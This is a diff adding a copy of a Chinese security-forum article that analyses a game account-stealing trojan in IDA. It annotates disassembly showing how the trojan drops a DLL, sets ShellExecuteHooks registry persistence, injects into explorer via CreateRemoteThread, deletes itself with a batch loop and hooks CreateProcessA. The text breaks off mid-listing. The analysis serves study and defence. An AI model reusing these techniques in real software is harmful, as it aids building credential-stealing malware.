@@ -1,0 +1,837 @@
+
+
+# 一个网游盗号木马的汇编源码分析
+
+> 原文：[`www.pediy.com/kssd/pediy10/79363.html`](https://www.pediy.com/kssd/pediy10/79363.html)
+
+【文章标题】：一个网游盗号木马的汇编源码分析  
+【文章作者】:  newjueqi    
+【作者邮箱】: zengjiansheng1@126.com  
+【作者 QQ 号】: 190678908  
+【使用工具】: IDA  
+【操作平台】: XP-SP2  
+【作者声明】: 今年 7 月份学会汇编，9 月份买了《加密与解密 3》正式开始学软件安全，这段时间走过来后感慨良多！在新的一年来临之前，发表篇文章纪念一下 ^-^  
+  
+本文针对病毒源文件和生成的 DLL 分别作了分析。  
+  
+病毒有以下的行为:  
+  
+(1)病毒运行后释放 rijxckin.dll 到 C:\\WINDOWS\\system32\\  
+(2) 生成注册表项  
+1.HKEY\_CURRENT\_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Game\\  
+JXQY\\Url   
+2.HKEY\_CLASSES\_ROOT\\CLSID\\{35FD6584-698F-BCD2-602C-  
+698745210353}\\InprocServe        r32\\"",   
+3.HKEY\_CLASSES\_ROOT\\CLSID\\{35FD6584-698F-BCD2-602C-  
+698745210353}\\InprocServer32\\ThreadingModel,  
+4.HKEY\_LOCAL\_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\explo  
+rer\\ShellExecuteHooks\\{35FD6584-698F-BCD2-602C-698745210353},内容  
+为"rijxckin.dll"  
+  
+(3)把 C:\\WINDOWS\\system32\\rijxzkin.dll 文件注入到 explorer 进程  
+  
+(4)在临时文件夹里创建 bat 文件,用来删除病毒自身文件,bat 文件的内容如下(其  
+  
+中 C:\\a.exe 为病毒文件路径):  
+@echo off  
+:Loop  
+del "C:\\a.exe"  
+if exist "C\\a.exe" goto Loop  
+  
+  
+  
+(1)病毒运行后释放 rijxckin.dll 到 C:\\WINDOWS\\system32\\  
+第一步:查找 C:\\WINDOWS\\system32\\路径,看有没有 rijxckin.dll 文件  
+Unpacker:004026A8 FindFile        proc near               ; CODE XREF:   
+  
+FindBatFileAndDel+8 p  
+Unpacker:004026A8                                         ; FindBatFileAndDel+24 p ...  
+Unpacker:004026A8  
+Unpacker:004026A8 var\_144         = byte ptr -144h  
+Unpacker:004026A8  
+Unpacker:004026A8                 push    ebx  
+Unpacker:004026A9                 add     esp, 0FFFFFEC0h  
+Unpacker:004026AF                 xor     ebx, ebx  
+Unpacker:004026B1                 push    esp             ; lpFindFileData  
+Unpacker:004026B2                 push    eax             ; lpFileName  
+Unpacker:004026B3                 call    FindFirstFileA  
+Unpacker:004026B8                 cmp     eax, 0FFFFFFFFh  
+Unpacker:004026BB                 jz      short loc\_4026C5  
+Unpacker:004026BD                 test    \[esp+144h+var\_144\], 10h  
+Unpacker:004026C1                 jnz     short loc\_4026C5  
+Unpacker:004026C3                 mov     bl, 1  
+Unpacker:004026C5  
+Unpacker:004026C5 loc\_4026C5:                             ; CODE XREF:   
+  
+FindFile+13 j  
+Unpacker:004026C5                                         ; FindFile+19 j  
+Unpacker:004026C5                 push    eax             ; hFindFile  
+Unpacker:004026C6                 call    FindClose  
+Unpacker:004026CB                 mov     eax, ebx  
+Unpacker:004026CD                 add     esp, 140h  
+Unpacker:004026D3                 pop     ebx  
+Unpacker:004026D4                 retn  
+Unpacker:004026D4 FindFile        endp  
+  
+第二步:没有的话就从自身文件里释放出 rijxckin.dll 到 C:\\WINDOWS\\system32\\  
+  
+Unpacker:00402E2C                 push    esi             ; lpFileName  
+Unpacker:00402E2D                 mov     ecx, offset dword\_402F00 ;ASCII   
+  
+"ICO"  
+Unpacker:00402E32                 mov     edx, offset aMain ; "MAIN"  
+Unpacker:00402E37                 xor     eax, eax        ; hModule  
+Unpacker:00402E39                 call    CreateDllFile  
+{  
+Unpacker:00402AAC CreateDllFile   proc near               ; CODE XREF:   
+  
+sub\_402E18+21 p  
+Unpacker:00402AAC  
+Unpacker:00402AAC NumberOfBytesWritten= dword ptr -4  
+Unpacker:00402AAC lpFileName      = dword ptr  8  
+Unpacker:00402AAC  
+Unpacker:00402AAC                 push    ebp  
+Unpacker:00402AAD                 mov     ebp, esp  
+Unpacker:00402AAF                 push    ecx  
+Unpacker:00402AB0                 push    ebx  
+Unpacker:00402AB1                 push    esi  
+Unpacker:00402AB2                 push    edi  
+Unpacker:00402AB3                 mov     ebx, eax  
+Unpacker:00402AB5                 push    ecx             ; lpType  
+Unpacker:00402AB6                 push    edx             ; lpName  
+Unpacker:00402AB7                 push    ebx             ; hModule  
+Unpacker:00402AB8                 call    FindResourceA  
+Unpacker:00402ABD                 mov     esi, eax  
+Unpacker:00402ABF                 push    esi             ; hResInfo  
+Unpacker:00402AC0                 push    ebx             ; hModule  
+Unpacker:00402AC1                 call    SizeofResource  
+Unpacker:00402AC6                 mov     edi, eax        ;eax=5e00  
+Unpacker:00402AC8                 push    esi             ; hResInfo  
+Unpacker:00402AC9                 push    ebx             ; hModule  
+Unpacker:00402ACA                 call    LoadResource  
+Unpacker:00402ACF                 push    eax             ; hResData  
+Unpacker:00402AD0                 call    LockResource  
+Unpacker:00402AD5                 mov     esi, eax  
+Unpacker:00402AD7                 push    0               ; hTemplateFile  
+Unpacker:00402AD9                 push    80h             ; dwFlagsAndAttributes  
+Unpacker:00402ADE                 push    2               ; dwCreationDisposition  
+Unpacker:00402AE0                 push    0               ; lpSecurityAttributes  
+Unpacker:00402AE2                 push    2               ; dwShareMode  
+Unpacker:00402AE4                 push    40000000h       ; dwDesiredAccess  
+Unpacker:00402AE9                 mov     eax, \[ebp+lpFileName\]  
+Unpacker:00402AEC                 push    eax               
+  
+;lpFileName="C:\\WINDOWS\\system32\\rijxzkin.dll"  
+Unpacker:00402AED                 call    CreateFileA  
+Unpacker:00402AF2                 mov     ebx, eax  
+Unpacker:00402AF4                 push    0               ; lpOverlapped  
+Unpacker:00402AF6                 lea     eax, \[ebp+NumberOfBytesWritten\]  
+Unpacker:00402AF9                 push    eax             ; lpNumberOfBytesWritten  
+Unpacker:00402AFA                 push    edi             ; nNumberOfBytesToWrite   
+  
+文件长度 5E00  
+Unpacker:00402AFB                 push    esi             ; lpBuffer ASCII "MZP"  
+Unpacker:00402AFC                 push    ebx             ; hFile  
+Unpacker:00402AFD                 call    WriteFile\_0  
+Unpacker:00402B02                 push    ebx             ; hObject  
+Unpacker:00402B03                 call    CloseHandle  
+Unpacker:00402B08                 mov     al, 1  
+Unpacker:00402B0A                 pop     edi  
+Unpacker:00402B0B                 pop     esi  
+Unpacker:00402B0C                 pop     ebx  
+Unpacker:00402B0D                 pop     ecx  
+Unpacker:00402B0E                 pop     ebp  
+Unpacker:00402B0F                 retn    4  
+Unpacker:00402B0F CreateDllFile   endp  
+}  
+  
+(2) 生成注册表项  
+1.HKEY\_CURRENT\_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Game\\  
+JXQY\\Url ,内容为 00(200h)  
+2.HKEY\_CLASSES\_ROOT\\CLSID\\{35FD6584-698F-BCD2-602C-  
+698745210353}\\InprocServer32\\"",   
+3.HKEY\_CLASSES\_ROOT\\CLSID\\{35FD6584-698F-BCD2-602C-  
+698745210353}\\InprocServer32\\ThreadingModel,  
+4.HKEY\_LOCAL\_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\explo  
+rer\\ShellExecuteHooks\\{35FD6584-698F-BCD2-602C-698745210353},内容  
+为"rijxckin.dll"  
+  
+增加注册表的函数是:  
+Unpacker:00402B14 AddRegKey       proc near               ; CODE XREF:   
+  
+sub\_402C1C+7F p  
+Unpacker:00402B14                                         ; sub\_402C1C+D0 p ...  
+Unpacker:00402B14  
+Unpacker:00402B14 hKey            = dword ptr -4  
+Unpacker:00402B14 cbData          = dword ptr  8  
+Unpacker:00402B14 lpData          = dword ptr  0Ch  
+Unpacker:00402B14 dwType          = dword ptr  10h  
+Unpacker:00402B14  
+Unpacker:00402B14                 push    ebp  
+Unpacker:00402B15                 mov     ebp, esp  
+Unpacker:00402B17                 push    ecx  
+Unpacker:00402B18                 push    ebx  
+Unpacker:00402B19                 mov     ebx, ecx  
+Unpacker:00402B1B                 lea     ecx, \[ebp+hKey\]  
+Unpacker:00402B1E                 push    ecx             ; phkResult  
+Unpacker:00402B1F                 push    edx             ; lpSubKey  
+Unpacker:00402B20                 push    eax             ; hKey  
+Unpacker:00402B21                 call    RegCreateKeyA  
+Unpacker:00402B26                 mov     eax, \[ebp+cbData\]  
+Unpacker:00402B29                 push    eax             ; cbData  
+Unpacker:00402B2A                 mov     eax, \[ebp+lpData\]  
+Unpacker:00402B2D                 push    eax             ; lpData  
+Unpacker:00402B2E                 mov     eax, \[ebp+dwType\]  
+Unpacker:00402B31                 push    eax             ; dwType  
+Unpacker:00402B32                 push    0               ; Reserved  
+Unpacker:00402B34                 push    ebx             ; lpValueName  
+Unpacker:00402B35                 mov     eax, \[ebp+hKey\]  
+Unpacker:00402B38                 push    eax             ; hKey  
+Unpacker:00402B39                 call    RegSetValueExA  
+Unpacker:00402B3E                 mov     ebx, eax  
+Unpacker:00402B40                 mov     eax, \[ebp+hKey\]  
+Unpacker:00402B43                 push    eax             ; hKey  
+Unpacker:00402B44                 call    RegCloseKey\_0  
+Unpacker:00402B49                 mov     eax, ebx  
+Unpacker:00402B4B                 pop     ebx  
+Unpacker:00402B4C                 pop     ecx  
+Unpacker:00402B4D                 pop     ebp  
+Unpacker:00402B4E                 retn    0Ch  
+Unpacker:00402B4E AddRegKey       endp  
+  
+在 4 个地方分别调用了这个函数创建键值:   
+  
+00402A34 创建  
+HKEY\_CURRENT\_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Game\\JX  
+QY\\Url ,内容为 00(200h)  
+00402C9B 创建 HKEY\_CLASSES\_ROOT\\CLSID\\{35FD6584-698F-BCD2-602C-  
+698745210353}\\InprocServer32\\"",   
+00402CEC 创建 HKEY\_CLASSES\_ROOT\\CLSID\\{35FD6584-698F-BCD2-602C-  
+698745210353}\\InprocServer32\\ThreadingModel,  
+00402D4C 创建  
+HKEY\_LOCAL\_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\explore  
+r\\ShellExecuteHooks\\{35FD6584-698F-BCD2-602C-698745210353},内容  
+为"rijxckin.dll"  
+  
+  
+(3)把 C:\\WINDOWS\\system32\\rijxzkin.dll 文件注入到 explorer 进程  
+  
+一共分三步完成  
+第一步: 获取 explorer.exe 的句柄  
+Unpacker:00402510 GetExplorerHandle proc near             ; CODE XREF:   
+  
+sub\_402DD8+8 p  
+Unpacker:00402510  
+Unpacker:00402510 var\_138         = dword ptr -138h  
+Unpacker:00402510 var\_114         = byte ptr -114h  
+Unpacker:00402510  
+Unpacker:00402510                 push    ebx  
+Unpacker:00402511                 push    esi  
+Unpacker:00402512                 push    edi  
+Unpacker:00402513                 push    ebp  
+Unpacker:00402514                 add     esp, 0FFFFFED8h  
+Unpacker:0040251A                 mov     ebx, edx  
+Unpacker:0040251C                 mov     esi, eax  
+Unpacker:0040251E                 xor     edi, edi  
+Unpacker:00402520                 xor     edx, edx  
+Unpacker:00402522                 mov     eax, 2  
+Unpacker:00402527                 call    CreateModuleSnapshot ; 创建快照  
+Unpacker:0040252C                 mov     ebp, eax  
+Unpacker:0040252E                 mov     \[esp+138h+var\_138\], 128h  
+Unpacker:00402535                 mov     edx, esp  
+Unpacker:00402537                 mov     eax, ebp  
+Unpacker:00402539                 call    FindProcess     ; BDS 2005-2006 and   
+  
+Delphi6-7 Visual Component Library  
+Unpacker:0040253E                 jmp     short loc\_402560  
+Unpacker:00402540 ; -----------------------------------------------------------------  
+  
+\----------  
+Unpacker:00402540  
+Unpacker:00402540 loc\_402540:                             ; CODE XREF:   
+  
+GetExplorerHandle+58 j  
+Unpacker:00402540                 lea     eax, \[esp+138h+var\_114\]  
+Unpacker:00402544  
+Unpacker:00402544 loc\_402544:                             ; CODE XREF:   
+  
+Unpacker:loc\_40BA44 j  
+Unpacker:00402544                                         ; DATA XREF:   
+  
+Unpacker:0040BA3F o  
+Unpacker:00402544                 push    eax  
+Unpacker:00402545                 push    esi  
+Unpacker:00402546                 call    lstrcmpi       ;比较线程名字是  
+否"explorer",不是的话通过循环继续获取比较  
+Unpacker:0040254B                 test    eax, eax  
+Unpacker:0040254D                 jnz     short loc\_402557  
+Unpacker:0040254F                 mov     edi, \[esp+140h+var\_138\]  
+Unpacker:00402553                 test    bl, bl  
+Unpacker:00402555                 jz      short loc\_40256A  
+Unpacker:00402557  
+Unpacker:00402557 loc\_402557:                             ; CODE XREF: GetExplorerHandle+3D j  
+Unpacker:00402557                 mov     edx, esp  
+Unpacker:00402559                 mov     eax, ebp  
+Unpacker:0040255B                 call    FindProcessNext ; 获取快照中的下一个  
+进程名字  
+Unpacker:00402560  
+Unpacker:00402560 loc\_402560:                             ; CODE XREF:   
+  
+GetExplorerHandle+2E j  
+Unpacker:00402560                 cmp     eax, 1  
+Unpacker:00402563                 sbb     eax, eax  
+Unpacker:00402565                 inc     eax  
+Unpacker:00402566                 cmp     al, 1  
+Unpacker:00402568                 jz      short loc\_402540  
+Unpacker:0040256A  
+Unpacker:0040256A loc\_40256A:                             ; CODE XREF:   
+  
+GetExplorerHandle+45 j  
+Unpacker:0040256A                 push    ebp             ; hObject  
+Unpacker:0040256B                 call    CloseHandle  
+Unpacker:00402570                 mov     eax, edi  
+Unpacker:00402572                 add     esp, 128h  
+Unpacker:00402578                 pop     ebp  
+Unpacker:00402579                 pop     edi  
+Unpacker:0040257A                 pop     esi  
+Unpacker:0040257B                 pop     ebx  
+  
+Unpacker:0040257B GetExplorerHandle endp ;   
+  
+第二步: 检查 explorer 进程中是否已有 rijxzkin.dll 文件  
+Unpacker:00402580 FindDllModule   proc near               ; CODE XREF:   
+  
+sub\_402DD8+18 p  
+Unpacker:00402580  
+Unpacker:00402580 var\_234         = dword ptr -234h  
+Unpacker:00402580 var\_220         = dword ptr -220h  
+Unpacker:00402580 var\_214         = byte ptr -214h  
+Unpacker:00402580 var\_114         = byte ptr -114h  
+Unpacker:00402580  
+Unpacker:00402580                 push    ebx  
+Unpacker:00402581                 push    esi  
+Unpacker:00402582                 push    edi  
+Unpacker:00402583                 push    ebp  
+Unpacker:00402584                 add     esp, 0FFFFFDDCh  
+Unpacker:0040258A                 mov     edi, ecx  
+Unpacker:0040258C                 mov     ebx, edx  
+Unpacker:0040258E                 mov     esi, eax  
+Unpacker:00402590                 xor     ebp, ebp  
+Unpacker:00402592                 test    edi, edi  
+Unpacker:00402594                 jz      short loc\_4025A2  
+Unpacker:00402596                 mov     edx, 104h  
+Unpacker:0040259B                 mov     eax, edi  
+Unpacker:0040259D                 call    @Windows@ZeroMemory$qqrpvui ;   
+  
+Windows::ZeroMemory(void \*,uint)  
+Unpacker:004025A2  
+Unpacker:004025A2 loc\_4025A2:                             ; CODE XREF:   
+  
+FindDllModule+14 j  
+Unpacker:004025A2                 mov     edx, esi  
+Unpacker:004025A4                 mov     eax, 8  
+Unpacker:004025A9                 call    CreateModuleSnapshot ; 创建快照  
+Unpacker:004025AE                 mov     esi, eax  
+Unpacker:004025B0                 mov     \[esp+234h+var\_234\], 224h  
+Unpacker:004025B0                                         ; CODE XREF:   
+  
+Unpacker:loc\_40BAB4 j  
+Unpacker:004025B7                 mov     edx, esp  
+Unpacker:004025B9                 mov     eax, esi  
+Unpacker:004025BB                 call    FindModuleFirst ; 查找 explorer 进程中是  
+  
+否已有"rijxzkin.dll"  
+Unpacker:004025C0                 cmp     eax, 1  
+Unpacker:004025C3                 sbb     eax, eax  
+Unpacker:004025C5                 inc     eax  
+Unpacker:004025C6                 cmp     al, 1  
+Unpacker:004025C8                 jnz     short loc\_402608  
+Unpacker:004025CA  
+Unpacker:004025CA loc\_4025CA:                             ; CODE XREF:   
+  
+FindDllModule+86 j  
+Unpacker:004025CA                 test    ebx, ebx  
+Unpacker:004025CC                 jz      short loc\_4025DD  
+Unpacker:004025CE                 lea     eax, \[esp+234h+var\_214\]  
+Unpacker:004025D2                 push    eax  
+Unpacker:004025D3                 push    ebx  
+Unpacker:004025D4                 call    lstrcmpi  
+Unpacker:004025D9                 test    eax, eax  
+Unpacker:004025DB                 jnz     short loc\_4025F5  
+Unpacker:004025DD  
+Unpacker:004025DD loc\_4025DD:                             ; CODE XREF:   
+  
+FindDllModule+4C j  
+Unpacker:004025DD                 test    edi, edi  
+Unpacker:004025DF                 jz      short loc\_4025EF  
+Unpacker:004025E1                 lea     eax, \[esp+234h+var\_114\]  
+Unpacker:004025E8                 push    eax  
+Unpacker:004025E9                 push    edi  
+Unpacker:004025EA                 call    lstrcpy  
+Unpacker:004025EF  
+Unpacker:004025EF loc\_4025EF:                             ; CODE XREF:   
+  
+FindDllModule+5F j  
+Unpacker:004025EF                 mov     ebp, \[esp+234h+var\_220\]  
+Unpacker:004025F3                 jmp     short loc\_402608  
+Unpacker:004025F5 ; -----------------------------------------------------------------  
+  
+\----------  
+Unpacker:004025F5  
+Unpacker:004025F5 loc\_4025F5:                             ; CODE XREF:   
+  
+FindDllModule+5B j  
+Unpacker:004025F5                 mov     edx, esp  
+Unpacker:004025F7                 mov     eax, esi  
+Unpacker:004025F9                 call    FindModuleNext  ; 继续查找 explorer 进程  
+  
+中是否已加载"rijxzkin.dll"  
+Unpacker:004025FE                 cmp     eax, 1  
+Unpacker:00402601                 sbb     eax, eax  
+Unpacker:00402603                 inc     eax  
+Unpacker:00402604                 cmp     al, 1  
+Unpacker:00402606                 jz      short loc\_4025CA  
+Unpacker:00402608  
+Unpacker:00402608 loc\_402608:                             ; CODE XREF:   
+  
+FindDllModule+48 j  
+Unpacker:00402608                                         ; FindDllModule+73 j  
+Unpacker:00402608                 push    esi             ; hObject  
+Unpacker:00402609                 call    CloseHandle  
+Unpacker:0040260E                 mov     eax, ebp  
+Unpacker:00402610                 add     esp, 224h  
+Unpacker:00402616                 pop     ebp  
+Unpacker:00402617                 pop     edi  
+Unpacker:00402618                 pop     esi  
+Unpacker:00402619                 pop     ebx  
+Unpacker:0040261A                 retn  
+Unpacker:0040261A FindDllModule   endp  
+  
+第三步: 如果 explorer 进程中没 rijxzkin.dll,就把 rijxzkin.dll 注入 explorer  
+Unpacker:00402B54 InjectDllToExplore proc near            ; CODE XREF:   
+  
+sub\_402DD8+28 p  
+Unpacker:00402B54                 push    ebx  
+Unpacker:00402B55                 push    esi  
+Unpacker:00402B56                 push    edi  
+Unpacker:00402B57                 push    ecx  
+Unpacker:00402B58                 mov     edi, edx  
+Unpacker:00402B5A                 push    eax             ; dwProcessId  
+Unpacker:00402B5B                 push    0               ; bInheritHandle  
+Unpacker:00402B5D                 push    1F0FFFh         ; dwDesiredAccess  
+Unpacker:00402B62                 call    OpenProcess  
+Unpacker:00402B67                 mov     ebx, eax  
+Unpacker:00402B69                 push    4               ; flProtect  
+Unpacker:00402B6B                 push    1000h           ; flAllocationType  
+Unpacker:00402B70                 push    104h            ; dwSize  
+Unpacker:00402B75                 push    0               ; lpAddress  
+Unpacker:00402B77                 push    ebx             ; hProcess  
+Unpacker:00402B78                 call    VirtualAllocEx  
+Unpacker:00402B7D                 mov     esi, eax  
+Unpacker:00402B7F                 push    esp             ; lpNumberOfBytesWritten  
+Unpacker:00402B80                 push    104h            ; nSize  
+Unpacker:00402B85                 push    edi             ; lpBuffer  
+Unpacker:00402B86                 push    esi             ; lpBaseAddress  
+Unpacker:00402B87                 push    ebx             ; hProcess  
+Unpacker:00402B88                 call    WriteProcessMemory  
+Unpacker:00402B8D                 push    offset aLoadlibrarya ; "LoadLibraryA"  
+Unpacker:00402B92                 push    offset aKernel32\_dll ; "kernel32.dll"  
+Unpacker:00402B97                 call    GetModuleHandleA\_0  
+Unpacker:00402B9C                 push    eax             ; hModule  
+Unpacker:00402B9D                 call    GetProcAddress  
+Unpacker:00402BA2                 push    esp             ; lpThreadId  
+Unpacker:00402BA3                 push    0               ; dwCreationFlags  
+Unpacker:00402BA5                 push    esi             ; lpParameter  
+Unpacker:00402BA6                 push    eax             ; lpStartAddress  
+Unpacker:00402BA7                 push    0               ; dwStackSize  
+Unpacker:00402BA9                 push    0               ; lpThreadAttributes  
+Unpacker:00402BAB                 push    ebx             ; hProcess  
+Unpacker:00402BAC                 call    CreateRemoteThread  
+Unpacker:00402BB1                 mov     esi, eax  
+Unpacker:00402BB3                 push    ebx             ; hObject  
+Unpacker:00402BB4                 call    CloseHandle  
+Unpacker:00402BB9                 mov     eax, esi  
+Unpacker:00402BBB                 pop     edx  
+Unpacker:00402BBC                 pop     edi  
+Unpacker:00402BBD                 pop     esi  
+Unpacker:00402BBE                 pop     ebx  
+Unpacker:00402BBF                 retn  
+Unpacker:00402BBF InjectDllToExplore endp  
+  
+(4)在临时文件夹里创建 bat 文件,用来删除病毒自身文件,最后生成的 bat 文件的内  
+  
+容如下(其中 C:\\a.exe 为病毒文件路径):  
+@echo off  
+:Loop  
+del "C:\\a.exe"  
+if exist "C\\a.exe" goto Loop  
+  
+第一步:先通过获取一个临时文件夹用来存放 bat 文件,如果已存在就把原来的临  
+  
+时文件夹删除  
+第二步:生成 bat 文件并且执行  
+Unpacker:0040270C MakeBatFile proc near           ; CODE XREF:   
+  
+sub\_402F10+B1 p  
+Unpacker:0040270C  
+Unpacker:0040270C var\_610         = dword ptr -610h  
+Unpacker:0040270C var\_60C         = byte ptr -60Ch  
+Unpacker:0040270C CmdLine         = byte ptr -50Ch  
+Unpacker:0040270C var\_410         = byte ptr -410h  
+Unpacker:0040270C Buffer          = byte ptr -408h  
+Unpacker:0040270C  
+Unpacker:0040270C                 push    ebx  
+Unpacker:0040270D                 push    esi  
+Unpacker:0040270E                 add     esp, 0FFFFF9F8h  
+Unpacker:00402714                 mov     esi, eax  
+Unpacker:00402716                 xor     ebx, ebx  
+Unpacker:00402718                 mov     eax, esi        ; lpFileName  
+Unpacker:0040271A                 call    FindFile        ;检查病毒文件是否存在  
+Unpacker:0040271F                 cmp     al, 1  
+Unpacker:00402721                 jnz     loc\_402877  
+Unpacker:00402727                 lea     eax, \[esp+610h+CmdLine\]  
+Unpacker:0040272E                 push    eax             ; lpBuffer  
+Unpacker:0040272F                 push    104h            ; nBufferLength  
+Unpacker:00402734                 call    GetTempPathA     ;获取 bat 存放文件的  
+  
+临时目录  
+Unpacker:00402739                 push    offset dword\_402884  
+Unpacker:0040273E                 lea     eax, \[esp+614h+CmdLine\]  
+Unpacker:00402745                 push    eax  
+Unpacker:00402746                 call    lstrcat  
+Unpacker:0040274B                 call    GetTickCount  
+Unpacker:00402750                 mov     \[esp+610h+var\_610\], eax  
+Unpacker:00402753                 push    esp             ; arglist  
+Unpacker:00402754                 push    offset aD       ; "%d"  
+Unpacker:00402759                 lea     eax, \[esp+618h+var\_60C\]  
+Unpacker:0040275D                 push    eax             ; LPSTR  
+Unpacker:0040275E                 call    wvsprintfA  
+Unpacker:00402763                 lea     eax, \[esp+610h+var\_60C\]  
+Unpacker:00402767                 push    eax  
+Unpacker:00402768                 lea     eax, \[esp+614h+CmdLine\]  
+Unpacker:0040276F                 push    eax  
+Unpacker:00402770                 call    lstrcat  
+Unpacker:00402775                 push    offset a\_bat    ; ".bat"  
+Unpacker:0040277A                 lea     eax, \[esp+614h+CmdLine\]  
+Unpacker:00402781                 push    eax  
+Unpacker:00402782                 call    lstrcat  
+Unpacker:00402787                 lea     eax, \[esp+610h+CmdLine\] ;   
+  
+lpFileName  
+Unpacker:0040278E                 call    FindBatFileAndDel   ;如果临时文件名重复就把原的文件删除  
+Unpacker:00402793                 cmp     al, 1  
+Unpacker:00402795                 jnz     loc\_402877  
+Unpacker:0040279B                 push    offset a@echoOff ; "@echo off\\r\\n"  
+Unpacker:004027A0                 lea     eax, \[esp+614h+Buffer\]  
+Unpacker:004027A7                 push    eax             ; char  
+Unpacker:004027A8                 call    lstrcpy  
+Unpacker:004027AD                 push    offset aLoop    ; ":Loop\\r\\n"  
+Unpacker:004027B2                 lea     eax, \[esp+61Ch+var\_410\]  
+Unpacker:004027B9                 push    eax  
+Unpacker:004027BA                 call    lstrcat  
+Unpacker:004027BF                 push    offset aDel     ; "del \\""  
+Unpacker:004027C4                 lea     eax, \[esp+61Ch+var\_410\]  
+Unpacker:004027CB                 push    eax  
+Unpacker:004027CC                 call    lstrcat  
+Unpacker:004027D1                 push    esi  
+Unpacker:004027D2                 lea     eax, \[esp+61Ch+var\_410\]  
+Unpacker:004027D9                 push    eax  
+Unpacker:004027DA                 call    lstrcat  
+Unpacker:004027DF                 push    offset asc\_4028B0 ; "\\"\\r\\n"  
+Unpacker:004027E4                 lea     eax, \[esp+61Ch+var\_410\]  
+Unpacker:004027EB                 push    eax  
+Unpacker:004027EC                 call    lstrcat  
+Unpacker:004027F1                 push    offset aIfExist ; "if exist \\""  
+Unpacker:004027F6                 lea     eax, \[esp+61Ch+var\_410\]  
+Unpacker:004027FD                 push    eax  
+Unpacker:004027FE                 call    lstrcat  
+Unpacker:00402803                 push    esi  
+Unpacker:00402804                 lea     eax, \[esp+61Ch+var\_410\]  
+Unpacker:0040280B                 push    eax  
+Unpacker:0040280C                 call    lstrcat  
+Unpacker:00402811                 push    offset aGotoLoop ; "\\" goto Loop\\r\\n"  
+Unpacker:00402816                 lea     eax, \[esp+61Ch+var\_410\]  
+Unpacker:0040281D                 push    eax  
+Unpacker:0040281E                 call    lstrcat  
+Unpacker:00402823                 push    offset aDel0    ; "del %0\\r\\n"  
+Unpacker:00402828                 lea     eax, \[esp+61Ch+var\_410\]  
+Unpacker:0040282F                 push    eax  
+Unpacker:00402830                 call    lstrcat  
+Unpacker:00402835                 push    80h             ; dwFileAttributes  
+Unpacker:0040283A                 push    esi             ; lpFileName  
+Unpacker:0040283B                 call    SetFileAttributesA  
+Unpacker:00402840                 push    0  
+Unpacker:00402842                 push    1  
+Unpacker:00402844                 lea     eax, \[esp+620h+var\_410\]  
+Unpacker:0040284B                 push    eax  
+Unpacker:0040284C                 call    lstrlen  
+Unpacker:00402851                 mov     ecx, eax  
+Unpacker:00402853                 lea     edx, \[esp+618h+Buffer\] ; lpBuffer  
+Unpacker:0040285A                 lea     eax, \[esp+618h+CmdLine\] ;   
+  
+lpFileName  
+Unpacker:00402861                 call    AddOverlayToFile        ;把字符串的内容写入到 bat 文件中  
+Unpacker:00402866                 push    0               ; uCmdShow  
+Unpacker:00402868                 lea     eax, \[esp+614h+CmdLine\]  
+Unpacker:0040286F                 push    eax             ; lpCmdLine  
+Unpacker:00402870                 call    WinExec          ;执行 bat 文件  
+Unpacker:00402875                 mov     bl, 1  
+Unpacker:00402877  
+Unpacker:00402877 loc\_402877:                             ; CODE XREF:   
+  
+GetBatTempDirectory+15 j  
+Unpacker:00402877                                         ; GetBatTempDirectory+89 j  
+Unpacker:00402877                 mov     eax, ebx  
+Unpacker:00402879                 add     esp, 608h  
+Unpacker:0040287F                 pop     esi  
+Unpacker:00402880                 pop     ebx  
+Unpacker:00402881                 retn  
+Unpacker:00402881 MakeBatFile endp  
+  
+  
+      个人认为生成的 DLL 文件里有两个地方比较可取，一个是 hook API 部分（修改函数地址的前 5 个字节跳转到 hook 的函数），病毒作者把它弄成一个函数，在大量的场合都能用到; 另一个是搜索游戏进程匹配特征码部分，介绍了搜索游戏进程的常用方法，可以参考一下，这里只帖这两部分的分析，其它分析请看 IDB 文件  
+  
+一 .hook API 部分  
+  
+1.获取“CreateProcessA”的入口地址，并把地址保存在 dword\_40AFBC，  
+  
+dword\_40AFB8  
+  
+CODE:00404D8C                 push    offset aCreateprocessa ; "CreateProcessA"  
+CODE:00404D91                 push    ebx             ; hModule  
+CODE:00404D92                 call    GetProcAddress  
+CODE:00404D97                 mov     ds:dword\_40AFBC, eax  
+CODE:00404D9C                 mov     eax, ds:dword\_40AFBC  
+CODE:00404DA1                 mov     ds:dword\_40AFB8, eax  
+  
+2.读取“CreateProcessA”函数的前 5 个字节数据  
+  
+CODE:00404DA6                 lea     eax, \[ebp+NumberOfBytesRead\]  
+CODE:00404DA9                 push    eax             ; lpNumberOfBytesRead  
+CODE:00404DAA                 push    5               ; nSize  
+CODE:00404DAC                 push    offset unk\_40AFC0 ; lpBuffer  
+CODE:00404DB1                 mov     eax, ds:dword\_40AFB8  
+CODE:00404DB6                 push    eax             ; lpBaseAddress  
+CODE:00404DB7                 mov     eax, ds:hProcess  
+CODE:00404DBC                 push    eax             ; hProcess  
+CODE:00404DBD                 call    ReadProcessMemory  
+  
+3.改变“CreateProcessA”函数的前 5 个字节内存页的保护属性  
+  
+CODE:00402E09                 lea     eax, \[ebp+flOldProtect\]  
+CODE:00402E0C                 push    eax             ; lpflOldProtect  
+CODE:00402E0D                 push    4               ; flNewProtect  
+CODE:00402E0F                 push    5               ; dwSize  
+CODE:00402E11                 mov     esi, edi  
+CODE:00402E13                push    esi             ; lpAddress，“CreateProcessA”  
+的入口地址  
+CODE:00402E14                 call    VirtualProtect  
+  
+4.计算“CreateProcessA”的入口地址距离病毒 hook“CreateProcessA”函数的偏移值  
+  
+CODE:00402E1C                 mov     eax, \[ebp+arg\_0\]    ;\[ebp+arg\_0\]是 hook  
+“CreateProcessA”函数 sub\_403CB0 的地址  
+CODE:00402E1F                 sub     eax, edi  
+CODE:00402E21                 sub     eax, 5     ；由于跳转指令占了 5 个字节，所以减 5 后才正确的偏移  
+CODE:00402E24                 mov     \[ebp+var\_C\], eax  
+  
+5.使“CreateProcessA”的入口地址跳向病毒 hook“CreateProcessA”函数   
+sub\_403CB0  
+CODE:00402E37                 lea     eax, \[ebp+NumberOfBytesWritten\]  
+CODE:00402E3A                 push    eax             ; lpNumberOfBytesWritten  
+CODE:00402E3B                 push    5               ; nSize  
+CODE:00402E3D                 lea     eax, \[ebp+Buffer\]  
